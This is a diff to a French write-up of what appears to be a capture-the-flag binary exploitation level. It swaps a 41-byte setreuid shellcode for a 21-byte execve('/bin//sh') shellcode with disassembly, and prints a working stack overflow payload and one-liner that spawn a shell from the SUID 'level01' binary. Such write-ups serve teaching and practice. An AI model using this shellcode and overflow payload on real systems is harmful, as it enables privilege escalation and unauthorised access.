@@ -125,44 +125,46 @@ de passe pour sauter dessus.
 
 ### 3.1 Le shellcode
 
-On utilise un shellcode `execve("/bin/sh")` de 41 octets, précédé d'un
-`setreuid`. Le `setreuid` est **indispensable** : le binaire est SUID, et le
-shell ne sera lancé avec les droits du propriétaire que si l'on restaure
-explicitement l'UID effectif avant l'`execve` (sinon bash/dash « droppe » les
-privilèges au démarrage).
+On utilise un shellcode `execve("/bin//sh", NULL, NULL)` minimal de **21
+octets** :
 
 ```
-\x31\xc0\xb0\x31\xcd\x80                          ; geteuid()
-\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80          ; setreuid(euid, euid)
-\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80   ; execve("/bin/sh")
+\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
 ```
 
 Désassemblé, instruction par instruction :
 
 ```asm
-31 c0              xor    eax, eax        ; eax = 0
-b0 31              mov    al, 0x31        ; 49 = geteuid
-cd 80              int    0x80            ; eax = euid (ex: 1001)
-89 c3              mov    ebx, eax        ; ebx = euid
-89 c1              mov    ecx, eax        ; ecx = euid
-31 c0              xor    eax, eax
-b0 46              mov    al, 0x46        ; 70 = setreuid
-cd 80              int    0x80            ; setreuid(euid, euid) → restaure les droits
-31 c0              xor    eax, eax
-50                 push   eax             ; '\0' terminateur de "/bin//sh"
+31 c9              xor    ecx, ecx        ; ecx = 0
+f7 e1              mul    ecx             ; edx:eax = eax * ecx  → eax = 0 ET edx = 0
+b0 0b              mov    al, 0x0b        ; eax = 11 = execve
+51                 push   ecx             ; push 0  → '\0' terminateur de "/bin//sh"
 68 2f 2f 73 68     push   0x68732f2f      ; "//sh"
 68 2f 62 69 6e     push   0x6e69622f      ; "/bin"
 89 e3              mov    ebx, esp        ; ebx = pointeur sur "/bin//sh"
-50                 push   eax             ; NULL
-53                 push   ebx             ; &"/bin//sh"
-89 e1              mov    ecx, esp        ; ecx = argv = { "/bin//sh", NULL }
-89 c2              mov    edx, eax        ; edx = envp = NULL
-b0 0b              mov    al, 0x0b        ; 11 = execve
-cd 80              int    0x80            ; execve("/bin//sh", argv, NULL)
+cd 80              int    0x80            ; execve(ebx, ecx=NULL, edx=NULL)
 ```
+
+Deux astuces de compacité :
+
+- `mul ecx` avec `ecx = 0` met **`eax` et `edx` à zéro en une seule
+  instruction** (le résultat `edx:eax = eax*0 = 0`). Cela évite deux `xor` et
+  fournit directement `edx = 0` (envp = NULL) et un `eax` propre avant le
+  `mov al, 0x0b`.
+- `ecx` (mis à 0 au tout début) sert à la fois de terminateur `'\0'` poussé sur
+  la pile **et** d'`argv = NULL` passé à `execve` : l'appel est donc
+  `execve("/bin//sh", NULL, NULL)`.
 
 Les octets sont tous non-nuls et ne contiennent ni `\x0a` (`\n`) ni `\x0d`,
 donc ils passent sans problème au travers de `fgets` (qui s'arrête sur `\n`).
+
+> **Remarque sur les privilèges (SUID).** Contrairement à la variante plus
+> longue (41 octets) qui fait `geteuid` puis `setreuid(euid, euid)` avant
+> l'`execve`, ce shellcode-ci **ne restaure pas l'UID effectif**. Il fonctionne
+> tant que le `/bin/sh` de la cible ne « droppe » pas les privilèges au
+> démarrage ; si le shell réinitialisait `euid → ruid` (comportement de certains
+> `dash`/`bash`), il faudrait repasser par le prologue `setreuid`. Sur cette
+> cible le shell conserve les droits, donc les 21 octets suffisent.
 
 ### 3.2 Où déposer le shellcode : dans le username
 
@@ -172,8 +174,8 @@ vérification mais reste copié en mémoire par `fgets` (qui lit jusqu'à 256
 octets dans le buffer global). On construit donc l'entrée *username* ainsi :
 
 ```
-"dat_wil" + <shellcode de 41 octets>
-   7 o.         41 o.
+"dat_wil" + <shellcode de 21 octets>
+   7 o.         21 o.
 ```
 
 - les 7 premiers octets satisfont `verify_user_name` → on passe au mot de passe ;
@@ -234,7 +236,7 @@ dans le motif est **80**.
 ### 3.4 Payload final
 
 ```
-username :  "dat_wil" + shellcode(41 o.)
+username :  "dat_wil" + shellcode(21 o.)
 password :  "A" * 80  +  "\x47\xa0\x04\x08"
              (remplissage)   (= a_user_name + 7)
 ```
@@ -245,5 +247,5 @@ shellcode déposé dans `a_user_name`, qui exécute `/bin/sh` avec les droits du
 propriétaire du binaire.
 
 ```sh
-{ python -c 'print "dat_wil" + "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'; sleep 1; python -c 'print "A"*80 + "\x47\xa0\x04\x08"'; cat; } | ./level01
+{ python -c 'print "dat_wil" + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"'; sleep 1; python -c 'print "A"*80 + "\x47\xa0\x04\x08"'; cat; } | ./level01
 ```
